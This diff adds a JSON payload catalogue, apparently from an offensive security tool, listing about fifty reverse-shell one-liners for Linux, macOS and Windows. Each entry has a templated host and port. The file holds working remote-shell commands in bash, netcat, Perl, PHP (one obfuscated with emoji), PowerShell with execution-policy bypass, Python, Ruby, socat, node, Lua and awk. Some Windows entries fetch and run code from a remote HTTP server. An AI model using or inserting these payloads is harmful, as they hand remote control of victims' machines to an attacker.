@@ -1,0 +1,283 @@
+{
+	"shells": [
+		{ 
+			"name": "bash -i",
+			"command": "/bin/bash -c \"bash -i >& /dev/tcp/{local-host}/{tcp-listener-port} 0>&1\"",
+			"os": ["linux", "mac"]
+		},
+		{
+			"name": "bash 196",
+			"command": "/bin/bash -c \"0<&196;exec 196<>/dev/tcp/{local-host}/{tcp-listener-port}; /bin/bash <&196 >&196 2>&196\"",
+			"os": ["linux", "mac"]
+		},
+		{
+			"name": "Bash read line",
+			"command": "/bin/bash -c \"exec 5<>/dev/tcp/{local-host}/{tcp-listener-port};cat <&5 | while read line; do $line 2>&5 >&5; done\"",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Bash -l",
+			"command": "/bin/bash -c \"/bin/bash -l > /dev/tcp/{local-host}/{tcp-listener-port} 0<&1 2>&1\"",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Bash 5",
+			"command": "/bin/bash -c \"/bin/bash -i 5<> /dev/tcp/{local-host}/{tcp-listener-port} 0<&5 1>&5 2>&5\"",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "nc mkfifo",
+			"command": "rm /tmp/{random};mkfifo /tmp/{random};cat /tmp/{random}|{shell} -i 2>&1|nc {local-host} {tcp-listener-port} >/tmp/{random}",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "nc -e",
+			"command": "nc -e {shell} {local-host} {tcp-listener-port}",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "nc.exe -e",
+			"command": "nc -e {shell} {local-host} {tcp-listener-port}",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "where is nc.exe?"
+		},
+		{
+			"name": "nc -c",
+			"command": "nc -c {shell} {local-host} {tcp-listener-port}",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "ncat -e",
+			"command": "ncat {local-host} {tcp-listener-port} -e {shell}",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "ncat.exe -e",
+			"command": "ncat.exe {local-host} {tcp-listener-port} -e {shell}",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "where is ncat.exe?"
+		},
+		{
+			"name": "ncat.exe -e w/ download over cmd.exe",
+			"command": "cmd /c powershell -Command \"$Path = \\\"$env:TEMP\\ncat.exe\\\"; if(-not (Test-Path $Path)){Invoke-WebRequest http://{local-host}:{http-server-port}/ncat.exe -OutFile $Path}\" && %TEMP%\\ncat.exe {local-host} {tcp-listener-port} -e {shell}",
+			"os": [
+				"windows"
+			]
+		},
+		{
+			"name": "ncat.exe -e w/ download over powershell.exe",
+			"command": "$Path = $env:TEMP\\ncat.exe; if(-not (Test-Path $Path)){Invoke-WebRequest  http://{local-host}:{http-server-port}/ncat.exe -OutFile $Path}; &\"$env:TEMP\\ncat.exe\" {local-host} {tcp-listener-port} -e cmd.exe",
+			"os": [
+				"windows"
+			]
+		},
+		{
+			"name": "rustcat",
+			"command": "rcat {local-host} {tcp-listener-port} -r {shell}",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Perl",
+			"command": "perl -e 'use Socket;$i=\"{local-host}\";$p={tcp-listener-port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Perl no sh",
+			"command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{local-host}:{tcp-listener-port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "PHP Emoji",
+			"command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{local-host}\";$💻 = {tcp-listener-port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "PHP exec",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});exec(\"{shell} <&3 >&3 2>&3\");'",
+			"os": ["linux","windows","mac"]
+		},
+		{
+			"name": "PHP shell_exec",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "PHP system",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});system(\"{shell} <&3 >&3 2>&3\");'",
+			"os": ["linux","windows","mac"]
+		},
+		{
+			"name": "PHP passthru",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});passthru(\"{shell} <&3 >&3 2>&3\");'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "PHP `",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});`{shell} <&3 >&3 2>&3`;'",
+			"os": ["linux","windows","mac"]
+		},
+		{
+			"name": "PHP popen",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
+			"os": ["linux","windows","mac"]
+		},
+		{
+			"name": "PHP proc_open",
+			"command": "php -r '$sock=fsockopen(\"{local-host}\",{tcp-listener-port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
+			"os": ["linux","windows","mac"]
+		},
+		{
+			"name": "Windows ConPty",
+			"command": "powershell -c \"IEX(IWR http://{local-host}:{http-server-port}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {local-host} {tcp-listener-port}\"",
+			"os": ["windows"]
+		},
+		{
+			"name": "PowerShell #1 over CMD",
+			"command": "powershell -NoP -NonI -Exec Bypass -Command '$client = New-Object System.Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #1 over PowerShell (Plain)",
+			"command": "$client = New-Object System.Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #1 over PowerShell (IEX)",
+			"command": "Invoke-Expression -Command '$client = New-Object System.Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #2 over CMD",
+			"command": "powershell -nop -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{local-host}',{tcp-listener-port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #2 over PowerShell (Plain)",
+			"command": "$TCPClient = New-Object Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \"SHELL> \");$StreamWriter.Flush()}WriteToStream \"\";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #2 over PowerShell (IEX)",
+			"command": "Invoke-Expression -Command '$TCPClient = New-Object Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \"SHELL> \");$StreamWriter.Flush()}WriteToStream \"\";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #3 over CMD",
+			"command": "powershell.exe -nop  -ep bypass -noni -c \"$client = New-Object System.Net.Sockets.TCPClient('{local-host}',{tcp-listener-port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();\"",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #3 over Powershell (Plain)",
+			"command": "$client = New-Object System.Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #3 over Powershell (IEX)",
+			"command": "Invoke-Expression -Command '$client = New-Object System.Net.Sockets.TCPClient(\"{local-host}\",{tcp-listener-port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();'",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "needs to be checked."
+		},
+		{
+			"name": "PowerShell #4 (TLS)",
+			"command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{local-host}', {tcp-listener-port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+			"os": ["windows"],
+			"disabled": true,
+			"comments": "SSL must be implemented"
+		},
+		{
+			"name": "Python #1",
+			"command": "export RHOST=\"{local-host}\";export RPORT={tcp-listener-port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+			"os": ["linux","mac"	]
+		},
+		{
+			"name": "Python #2",
+			"command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local-host}\",{tcp-listener-port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Python3 #1",
+			"command": "export RHOST=\"{local-host}\";export RPORT={tcp-listener-port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Python3 #2",
+			"command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local-host}\",{tcp-listener-port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Python3 shortest",
+			"command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{local-host}\",{tcp-listener-port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+			"os": ["linux"]
+		},
+		{
+			"name": "Ruby #1",
+			"command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{local-host}\",{tcp-listener-port}))'",
+			"os": ["linux","mac"
+			]
+		},
+		{
+			"name": "Ruby no sh",
+			"command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{local-host}\",\"{tcp-listener-port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "socat #1",
+			"command": "socat tcp:{local-host}:{tcp-listener-port} exec:{shell}",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "socat #2 (TTY)",
+			"command": "socat tcp:{local-host}:{tcp-listener-port} exec:'{shell}',pty,stderr,setsid,sigint,sane",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "node.js",
+			"command": "node -e \"(function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('{shell}', []); var client = new net.Socket(); client.connect({tcp-listener-port}, '{local-host}', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();\"",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "telnet",
+			"command": "TF=$(mktemp -u);mkfifo $TF && telnet {local-host} {tcp-listener-port} 0<$TF | {shell} 1>$TF",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "zsh",
+			"command": "zsh -c 'zmodload zsh/net/tcp && ztcp {local-host} {tcp-listener-port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+			"os": ["linux","mac"]
+		},
+		{
+			"name": "Lua #1",
+			"command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{local-host}','{tcp-listener-port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
+			"os": ["linux"]
+		},
+		{
+			"name": "Lua #2",
+			"command": "lua5.1 -e 'local host, port = \"{local-host}\", {tcp-listener-port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
+			"os": ["linux"]
+		},
+		{
+			"name": "Awk",
+			"command": "awk 'BEGIN {s = \"/inet/tcp/0/{local-host}/{tcp-listener-port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+			"os": ["linux","mac"]
+		}
+	]
+}
